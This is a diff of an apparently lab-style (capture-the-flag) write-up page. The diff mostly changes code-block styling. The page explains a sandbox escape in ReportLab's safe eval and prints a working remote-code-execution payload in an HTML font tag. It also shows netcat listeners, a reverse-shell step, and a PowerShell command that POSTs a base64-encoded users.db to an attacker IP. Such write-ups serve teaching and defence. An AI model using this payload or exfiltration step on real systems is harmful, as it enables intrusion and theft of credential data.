-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>getattr(func, <span style="color:#e6db74">&#39;__globals__&#39;</span>)  <span style="color:#75715e"># gives access to the global scope</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>getattr(func, <span style="color:#e6db74">&#39;__globals__&#39;</span>)  <span style="color:#75715e"># gives access to the global scope</span>
 </span></span></code></pre></div><p>So we need a way to trick this check.</p>
 <h5 id="side-quest-what-does-func-dot-globals-do-and-why-is-it-dangerous">Side Quest: What does <code>func.__globals__</code> do &amp; why is it dangerous?</h5>
 <p>In Python, functions have an attribute called <code>__globals__</code> that points to the global namespace (i.e., the dictionary of all variables available when the function was defined).</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">my_func</span>():
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">my_func</span>():
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">42</span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>print(my_func<span style="color:#f92672">.</span>__globals__)
 </span></span></code></pre></div><p>This prints a dictionary — like:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;__name__&#39;</span>: <span style="color:#e6db74">&#39;__main__&#39;</span>,
 </span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;__doc__&#39;</span>: <span style="color:#66d9ef">None</span>,
 </span></span><span style="display:flex;"><span>  <span style="color:#e6db74">&#39;os&#39;</span>: <span style="color:#f92672">&lt;</span>module <span style="color:#e6db74">&#39;os&#39;</span> <span style="color:#f92672">from</span> <span style="color:#e6db74">&#39;...&#39;</span><span style="color:#f92672">&gt;</span>,
@@ -934,9 +934,9 @@ If we look at another response from this attack we can see two things, first it&
 <p>Why is that dangerous?</p>
 <p>Let&rsquo;s say we&rsquo;re inside a sandboxed <code>eval()</code> environment where built-ins like <code>open</code>, <code>os.system</code>, etc., are removed.</p>
 <p>But if you can do:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>getattr(safe_function, <span style="color:#e6db74">&#39;__globals__&#39;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>getattr(safe_function, <span style="color:#e6db74">&#39;__globals__&#39;</span>)
 </span></span></code></pre></div><p>…you can break out of that sandbox, because now you have:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>glbs <span style="color:#f92672">=</span> getattr(safe_function, <span style="color:#e6db74">&#39;__globals__&#39;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>glbs <span style="color:#f92672">=</span> getattr(safe_function, <span style="color:#e6db74">&#39;__globals__&#39;</span>)
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Windows</span>
 </span></span><span style="display:flex;"><span>glbs[<span style="color:#e6db74">&#39;os&#39;</span>]<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;calc.exe&#39;</span>)  <span style="color:#75715e"># on Windows</span>
@@ -954,7 +954,7 @@ If we look at another response from this attack we can see two things, first it&
 <li><code>__class__</code> → can give access to dangerous metaprogramming tools.</li>
 </ul>
 <p>If we bypass those restrictions using the fake Word class (see below), we can call:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>getattr(pow, Word(<span style="color:#e6db74">&#39;__globals__&#39;</span>))[<span style="color:#e6db74">&#39;os&#39;</span>]<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;calc.exe&#39;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>getattr(pow, Word(<span style="color:#e6db74">&#39;__globals__&#39;</span>))[<span style="color:#e6db74">&#39;os&#39;</span>]<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;calc.exe&#39;</span>)
 </span></span></code></pre></div><p>Even though &lsquo;<code>__globals__</code>&rsquo; is blocked in the sandbox, it gets sneaked in using a fake object that tricks the checks.</p>
 </li>
 </ul>
@@ -963,7 +963,7 @@ If we look at another response from this attack we can see two things, first it&
 <p>We can use this power to create a custom string-like object that lies about itself in order to pass the sandbox checks.</p>
 <h5 id="how-the-sandbox-works">How the Sandbox Works:</h5>
 <p>So we can understand the exploit we let’s look at this method that checks names in the safe eval system.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__rl_is_allowed_name__</span>(self, name):
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">__rl_is_allowed_name__</span>(self, name):
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> name <span style="color:#f92672">in</span> __rl_unsafe__ <span style="color:#f92672">or</span> (name<span style="color:#f92672">.</span>startswith(<span style="color:#e6db74">&#39;__&#39;</span>) <span style="color:#f92672">and</span> name <span style="color:#f92672">!=</span> <span style="color:#e6db74">&#39;__&#39;</span>):
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">raise</span> BadCode(<span style="color:#e6db74">&#34;Unsafe access of </span><span style="color:#e6db74">%s</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">%</span> name)
 </span></span></code></pre></div><ul>
@@ -981,7 +981,7 @@ If we look at another response from this attack we can see two things, first it&
 <p>The key here is that <strong>both of these checks rely on the string’s methods</strong> — and we can override them.</p>
 <h4 id="creating-the-custom-string-class">Creating The Custom String Class:</h4>
 <p>Here’s the class the we can build, using the recovered <code>type()</code> to trick the sandbox:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Recover true type to enable us to create a class</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Recover true type to enable us to create a class</span>
 </span></span><span style="display:flex;"><span>orgTypeFun <span style="color:#f92672">=</span> type(type(<span style="color:#ae81ff">1</span>))
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e"># Call recovered type to create a class</span>
@@ -995,21 +995,21 @@ If we look at another response from this attack we can see two things, first it&
 </span></span></code></pre></div><h5 id="let-s-break-this-down">Let’s break this down:</h5>
 <ol>
 <li>Create the new class:
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Word <span style="color:#f92672">=</span> orgTypeFun(<span style="color:#e6db74">&#39;Word&#39;</span>, (str,), { <span style="color:#f92672">...</span> })
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>Word <span style="color:#f92672">=</span> orgTypeFun(<span style="color:#e6db74">&#39;Word&#39;</span>, (str,), { <span style="color:#f92672">...</span> })
 </span></span></code></pre></div></li>
 </ol>
 <p>This is creating a new class called <code>Word</code>, that inherits from <code>str,</code> using the recovered original <code>type()</code> function.</p>
 <p>The <code>str</code> inheritance means the object behaves mostly like a normal string, but we’re overriding key behaviors.</p>
 <h5 id="what-s-overridden-and-why">What’s Overridden and Why:</h5>
 <p>We are going to leave this int here at the moment as it will come into play a bit later on and make more sense, however just know that we create an object called <code>mutated</code> which has the int value of <code>1</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#39;mutated&#39;</span>: <span style="color:#ae81ff">1</span>,
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#39;mutated&#39;</span>: <span style="color:#ae81ff">1</span>,
 </span></span></code></pre></div><ul>
 <li>
 <ol>
 <li><code>startswith</code>: Bypassing the <code>__</code> check</li>
 </ol>
 <p>We want to bypass the <code>(name.startswith('__')</code> check that happens in the sandbox, we do this with the following lines.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#39;startswith&#39;</span>: <span style="color:#66d9ef">lambda</span> self, x: <span style="color:#66d9ef">False</span>,
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#39;startswith&#39;</span>: <span style="color:#66d9ef">lambda</span> self, x: <span style="color:#66d9ef">False</span>,
 </span></span></code></pre></div><p>This line is defining a method named <code>startswith</code> for a class, and it&rsquo;s using a lambda function <strong>that always returns</strong> <code>False</code> regardless of the input.</p>
 <p>Breaking it down:</p>
 <p>&lsquo;<code>startswith</code>&rsquo; is the name of the method being defined
@@ -1024,15 +1024,15 @@ If we look at another response from this attack we can see two things, first it&
 <li><code>__eq__</code>: Tricking exact string comparison:</li>
 </ol>
 <p>The sandbox also checks the following:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> name <span style="color:#f92672">in</span> __rl_unsafe__:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> name <span style="color:#f92672">in</span> __rl_unsafe__:
 </span></span></code></pre></div><p>To pass this check, the string should not match known bad strings like &lsquo;<code>__globals__</code>&rsquo;.</p>
 <p>Python does this check by calling <code>__eq__</code> for comparisons but remember we are using a custom subclass of <code>str</code>, so with the below we are overriding the built in functionality of <code>__eq__</code>.</p>
 <p>So, we override <code>__eq__</code> with the following code.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#39;mutated&#39;</span>:<span style="color:#ae81ff">1</span>,
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#39;mutated&#39;</span>:<span style="color:#ae81ff">1</span>,
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;__eq__&#39;</span>    : <span style="color:#66d9ef">lambda</span> self, x: self<span style="color:#f92672">.</span>mutate() <span style="color:#f92672">and</span> self<span style="color:#f92672">.</span>mutated <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span> <span style="color:#f92672">and</span> str(self) <span style="color:#f92672">==</span> x,
 </span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;mutate&#39;</span>    : <span style="color:#66d9ef">lambda</span> self: {setattr(self, <span style="color:#e6db74">&#39;mutated&#39;</span>, self<span style="color:#f92672">.</span>mutated <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
 </span></span></code></pre></div><p>We need to know what <code>mutate</code> does before this will make sense so let me explain that:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#39;mutate&#39;</span>    : <span style="color:#66d9ef">lambda</span> self: {setattr(self, <span style="color:#e6db74">&#39;mutated&#39;</span>, self<span style="color:#f92672">.</span>mutated <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#39;mutate&#39;</span>    : <span style="color:#66d9ef">lambda</span> self: {setattr(self, <span style="color:#e6db74">&#39;mutated&#39;</span>, self<span style="color:#f92672">.</span>mutated <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
 </span></span></code></pre></div><ul>
 <li>It decrements the <code>mutated</code> attribute by <code>1</code> using <code>setattr</code>, remember at the start of this I showed how we created an object called <code>mutated</code> with a value of <code>1</code>? Well in simple terms it takes the <code>mutated</code> value which we set as <code>1</code> at the start and deducts <code>1</code>, this may sound weird but will make more sense soon.</li>
 </ul>
@@ -1060,7 +1060,7 @@ If we look at another response from this attack we can see two things, first it&
 </li>
 </ol>
 <p>So when the sandbox checks:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> name <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__globals__&#39;</span>:
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#66d9ef">if</span> name <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;__globals__&#39;</span>:
 </span></span></code></pre></div><ul>
 <li>First time it runs, when the sandbox checks if it&rsquo;s dangerous:
 <ul>
@@ -1093,7 +1093,7 @@ If we look at another response from this attack we can see two things, first it&
 </ol>
 <p>The sandbox might put strings into sets or dicts, so the object needs to be hashable.</p>
 <p>This returns the hash of the real string, that&rsquo;s all.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#39;__hash__&#39;</span>: <span style="color:#66d9ef">lambda</span> self: hash(str(self))
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#e6db74">&#39;__hash__&#39;</span>: <span style="color:#66d9ef">lambda</span> self: hash(str(self))
 </span></span></code></pre></div><p>It ensures it can be used in any place that expects a regular string.</p>
 </li>
 </ul>
@@ -1107,19 +1107,19 @@ If we look at another response from this attack we can see two things, first it&
 <h4 id="step-3-access-the-globals">Step 3: Access the globals:</h4>
 <p>In Python, every function remembers where it came from using <code>__globals__</code>, (remember I said this above.) Well inside the sandbox, &ldquo;safe&rdquo; functions like <code>pow()</code> still remember their <code>__globals__</code> which means we can use our Word class (which has all the sneaky bypasses) to access these <code>__globals__</code> and in turn call these functions that are inherently part of them.</p>
 <p>We use our Word class to ask:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>globalsattr <span style="color:#f92672">=</span> Word(<span style="color:#e6db74">&#39;__globals__&#39;</span>)
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>globalsattr <span style="color:#f92672">=</span> Word(<span style="color:#e6db74">&#39;__globals__&#39;</span>)
 </span></span><span style="display:flex;"><span>glbs <span style="color:#f92672">=</span> getattr(pow, globalsattr)
 </span></span></code></pre></div><p>Now we have the sandbox’s globals! We can do the following.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>glbs[<span style="color:#e6db74">&#39;os&#39;</span>]<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;calc.exe&#39;</span>)  <span style="color:#75715e"># 🎉 Calculator opens!</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>glbs[<span style="color:#e6db74">&#39;os&#39;</span>]<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;calc.exe&#39;</span>)  <span style="color:#75715e"># 🎉 Calculator opens!</span>
 </span></span></code></pre></div><h4 id="step-4-put-it-all-in-one-line">Step 4: Put it all in one line:</h4>
 <p>So now we have all the relevant parts of the bypass made.
 However, the sandbox only allows single-line expressions, so we can’t write normal multi-line Python code.</p>
 <p>To get around this, we use a list comprehension, which lets us run multiple things inside a single line.</p>
 <p>One odd thing to note: with list comprehensions like:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[print(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;Hello&#39;</span>]]
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[print(x) <span style="color:#66d9ef">for</span> x <span style="color:#f92672">in</span> [<span style="color:#e6db74">&#39;Hello&#39;</span>]]
 </span></span></code></pre></div><p>Python reads the innermost part first, and then moves outward — so it can feel like you’re reading from the bottom up.</p>
 <p>So, the full attack looks like:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>[
 </span></span><span style="display:flex;"><span>  [
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Run the command using system()</span>
 </span></span><span style="display:flex;"><span>    getattr(pow, Word(<span style="color:#e6db74">&#39;__globals__&#39;</span>))[<span style="color:#e6db74">&#39;os&#39;</span>]<span style="color:#f92672">.</span>system(<span style="color:#e6db74">&#39;[maliciousCommandHere]&#39;</span>)
@@ -1181,13 +1181,13 @@ However, the sandbox only allows single-line expressions, so we can’t write no
 <p>A lot of apps and libraries use the Reportlab library for example xhtml2pdf utility function is vulnerable and can suffer from code execution while transforming malicious HTML to pdf</p>
 </blockquote>
 <p>I have modified the initial payload to be a ping command as this should be accessible by most OS&rsquo;s and enable us to prove RCE.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">para</span>&gt;
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">para</span>&gt;
 </span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">font</span> <span style="color:#a6e22e">color</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;[ [ getattr(pow,Word(&#39;__globals__&#39;))[&#39;os&#39;].system(&#39;ping 10.10.14.20&#39;) for Word in [orgTypeFun(&#39;Word&#39;, (str,), { &#39;mutated&#39;: 1, &#39;startswith&#39;: lambda self, x: False, &#39;__eq__&#39;: lambda self,x: self.mutate() and self.mutated &lt; 0 and str(self) == x, &#39;mutate&#39;: lambda self: {setattr(self, &#39;mutated&#39;, self.mutated - 1)}, &#39;__hash__&#39;: lambda self: hash(str(self)) })] ] for orgTypeFun in [type(type(1))] ] and &#39;red&#39;&#34;</span>&gt;
 </span></span><span style="display:flex;"><span>    exploit
 </span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">font</span>&gt;
 </span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">para</span>&gt;
 </span></span></code></pre></div><p>We need to start a listener using <code>tcpdump</code> to listen out for the ICMP requests that we get</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo tcpdump -i tun0 icmp
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>sudo tcpdump -i tun0 icmp
 </span></span></code></pre></div><h3 id="getting-rce-on-the-target">Getting RCE On The Target:</h3>
 <h4 id="finding-our-injection-point-for-rce">Finding our injection point for RCE:</h4>
 <p>Now we have a payload and a listener setup we need to actually find somewhere to inject this on the web-app. To save you all heartache, here are the things I tried before finding a valid injection point:</p>
@@ -1233,7 +1233,7 @@ However, the sandbox only allows single-line expressions, so we can’t write no
 <ol>
 <li>
 <p>Create listener</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">8888</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">8888</span>
 </span></span></code></pre></div></li>
 <li>
 <p>Modify the payload to be a curl request:</p>
@@ -1262,7 +1262,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </li>
 </ul>
 <p>Start out listener:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">8888</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">8888</span>
 </span></span></code></pre></div><p>Modify the payload, by again capturing a POST request and sending it to Repeater.</p>
 <ul>
 <li><figure><img src="/ox-hugo/2025-04-18-094454_.png">
@@ -1287,7 +1287,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 <ol>
 <li>
 <p>First we convert the <code>users.db</code> object to base64 and store it in the variable <code>$b64</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$b64 = [<span style="color:#66d9ef">System.Convert</span>]::ToBase64String((Get-Content -path <span style="color:#e6db74">&#34;C:\Users\blake\Documents\app\instance\users.db&#34;</span> -Encoding byte))
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>$b64 = [<span style="color:#66d9ef">System.Convert</span>]::ToBase64String((Get-Content -path <span style="color:#e6db74">&#34;C:\Users\blake\Documents\app\instance\users.db&#34;</span> -Encoding byte))
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-18-155224_.png">
 </figure>
@@ -1296,11 +1296,11 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 </li>
 <li>
 <p>Start a listener on our host:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">8888</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>nc -nvlp <span style="color:#ae81ff">8888</span>
 </span></span></code></pre></div></li>
 <li>
 <p>Send the base64 encoded string to our listener:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-WebRequest -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.14.<span style="color:#ae81ff">20</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8888</span>/ -Method POST -Body $b64
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-powershell" data-lang="powershell"><span style="display:flex;"><span>Invoke-WebRequest -Uri http<span style="color:#960050;background-color:#1e0010">:</span>//<span style="color:#ae81ff">10.10</span>.14.<span style="color:#ae81ff">20</span><span style="color:#960050;background-color:#1e0010">:</span><span style="color:#ae81ff">8888</span>/ -Method POST -Body $b64
 </span></span></code></pre></div><ul>
 <li><figure><img src="/ox-hugo/2025-04-18-153915_.png">
 </figure>
@@ -1318,7 +1318,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 <p>Now we decode the bas64 back into <code>users.db</code></p>
 </li>
 </ol>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;base64string&#34;</span> | base64 -d -w <span style="color:#ae81ff">0</span> &gt; users.db
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;base64string&#34;</span> | base64 -d -w <span style="color:#ae81ff">0</span> &gt; users.db
 </span></span></code></pre></div><h3 id="finding-users-passwords-in-users-dot-db">Finding Users Passwords in <code>users.db</code>:</h3>
 <p>We can load the <code>users.db</code> file into sqlitebrowser and looking at the <code>user</code> table we can see it contains usernames and passwords</p>
 <ul>
@@ -1353,7 +1353,7 @@ We are going to use a super simple base64 encoded powershell reverse shell avail
 <h2 id="3-dot-lateral-movement">3. Lateral Movement:</h2>
